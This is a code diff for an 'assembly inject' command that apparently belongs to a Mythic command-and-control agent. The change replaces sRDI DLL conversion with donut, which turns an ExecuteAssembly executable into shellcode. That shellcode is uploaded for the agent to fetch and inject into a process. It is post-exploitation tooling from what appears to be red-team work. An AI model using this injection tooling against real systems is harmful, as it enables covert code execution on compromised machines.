@@ -2,9 +2,9 @@ from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
 from os import path
-from sRDI import ShellcodeRDI
 from mythic_payloadtype_container.MythicRPC import *
 import base64
+import donut
 
 class AssemblyInjectArguments(TaskArguments):
 
@@ -60,18 +60,18 @@ class AssemblyInjectCommand(CommandBase):
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         arch = task.args.get_arg("arch")
         pipe_name = str(uuid4())
-        dllFile = path.join(self.agent_code_path, f"AssemblyLoader_{arch}.dll")
-        dllBytes = open(dllFile, 'rb').read()
-        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), pipe_name.encode(), 0)
         task.args.add_arg("pipe_name", pipe_name)
-        resp = await MythicRPC().execute("create_file",
-                                         task_id=task.id,
-                                         file=base64.b64encode(converted_dll).decode(),
-                                         delete_after_fetch=True)
-        if resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
+        exePath = path.join(self.agent_code_path, "ExecuteAssembly/bin/Release/ExecuteAssembly.exe")
+        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
+        file_resp = await MythicRPC().execute("create_file",
+                                              task_id=task.id,
+                                              file=base64.b64encode(donutPic).decode(),
+                                              delete_after_fetch=True)
+        if file_resp.status == MythicStatus.Success:
+            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception(f"Failed to host sRDI loader stub: {resp.error}")
+            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
+
         task.args.remove_arg("arch")
         
         return task
